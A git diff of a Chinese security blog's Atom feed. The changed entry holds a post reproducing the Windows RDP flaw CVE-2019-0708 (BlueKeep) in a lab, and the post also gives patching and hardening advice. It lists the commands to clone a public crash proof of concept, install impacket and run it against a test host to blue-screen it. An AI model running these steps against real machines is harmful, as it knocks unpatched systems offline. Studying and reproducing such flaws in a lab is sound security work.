@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.teamssix.com/"/>
-  <updated>2019-06-15T02:11:09.055Z</updated>
+  <updated>2019-06-15T02:11:28.366Z</updated>
   <id>http://www.teamssix.com/</id>
   
   <author>
@@ -21,7 +21,7 @@
     <link href="http://www.teamssix.com/year/190615-013724.html"/>
     <id>http://www.teamssix.com/year/190615-013724.html</id>
     <published>2019-06-14T17:37:24.000Z</published>
-    <updated>2019-06-15T02:11:09.055Z</updated>
+    <updated>2019-06-15T02:11:28.366Z</updated>
     
     <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><blockquote><p>2019年5月14日微软官方发布安全补丁，修复了Windows远程桌面服务的远程代码执行漏洞，该漏洞影响了某些旧版本的Windows系统。此漏洞是预身份验证且无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用。利用此漏洞的任何恶意软件都可能从被感染的计算机传播到其他易受攻击的计算机，其方式与2017年WannaCry恶意软件的传播方式类似。</p></blockquote><p>以上内容来自360网络安全响应中心。<br>从微软官方的消息一出，各大安全厂商都开始发布了漏洞预警，那段时间我也一直在找对应的POC，但要不就是不能利用的POC，要不就是利用以前漏洞写的POC，更有甚着点击attack后给你惊喜。<br><img src="http://pt2jsbugk.bkt.clouddn.com/2019-07081.gif" alt="图片"><br>看到这个图片的时候，真的一副生无可恋的样子，随着时间推移，渐渐的也就不怎么关注这个漏洞了。<br>直到今天，看到网上有人发一些关于这个漏洞的利用复现视频的时候，才意识到已经过去正好一个月的，此时POC也早就被公布了。<br>早在在5月31日的时候，n1xbyte就在Github上发布了利用该漏洞导致系统蓝屏的可用POC ,所以我们来复现看看吧。</p><a id="more"></a><h1 id="0x01-下载POC"><a href="#0x01-下载POC" class="headerlink" title="0x01 下载POC"></a>0x01 下载POC</h1><p>首先git clone代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n1xbyte/CVE-2019-0708.git</span><br><span class="line">cd CVE-2019-0708</span><br></pre></td></tr></table></figure><p><img src="http://pt2jsbugk.bkt.clouddn.com/2019-07082.png" alt="图片"></p><h1 id="0x02-开始复现"><a href="#0x02-开始复现" class="headerlink" title="0x02 开始复现"></a>0x02 开始复现</h1><p>1、为了顺利复现成功，需要将被攻击机的远程桌面设为允许，防火墙也需要关掉。<br>2、被攻击机的IP地址与操作系统信息如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#被攻击主机</span><br><span class="line">ip地址：192.168.1.106</span><br><span class="line">系统类型：64位</span><br></pre></td></tr></table></figure><p>3、安装需要的库后执行POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install impacket</span><br><span class="line">python3 crashpoc.py 192.168.1.106 64  #python3 crashpoc.py ip地址 系统类型</span><br></pre></td></tr></table></figure><p><img src="http://pt2jsbugk.bkt.clouddn.com/2019-07083.png" alt="图片"><br>POC被成功被执行，虽然现阶段只是让目标蓝屏，但是对这个漏洞的利用手段绝对不会止步于此。</p><h1 id="0x03-修复方案"><a href="#0x03-修复方案" class="headerlink" title="0x03 修复方案"></a>0x03 修复方案</h1><p>1、最简便的方法就是安装一个安全管家，比如火绒、360之类的<br>2、把系统的自动更新打开或者到微软官网<a href="https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">下载补丁</a><br>3、把自己电脑上的远程桌面关掉、防火墙开启</p><h1 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h1><p>总是有人说没有绝对的安全，当然事实也确实是如此，但是只要我们平时养成一个良好的安全习惯，还是可以避免很多病毒木马的侵害的，毕竟很多的恶意程序都是广撒网，捕的鱼多不多就是另一回事儿了。</p><p><strong>最后再次强调，不得将本视频用作违法犯罪目的，本视频只用作技术分享交流学习使用。</strong></p><p>下面为视频演示：</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=55626994&cid=97251766&page=1" " scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"> </iframe></div><p>如果视频不能全屏播放，请点击<a href="https://www.bilibili.com/video/av55626994/" title="视频地址" target="_blank" rel="noopener">视频地址</a>进行观看。</p>]]></content>
     
@@ -39,7 +39,7 @@
     
       <category term="漏洞复现" scheme="http://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
     
-      <category term="CVE" scheme="http://www.teamssix.com/tags/CVE/"/>
+      <category term="CVE 2019-0708" scheme="http://www.teamssix.com/tags/CVE-2019-0708/"/>
     
   </entry>
   
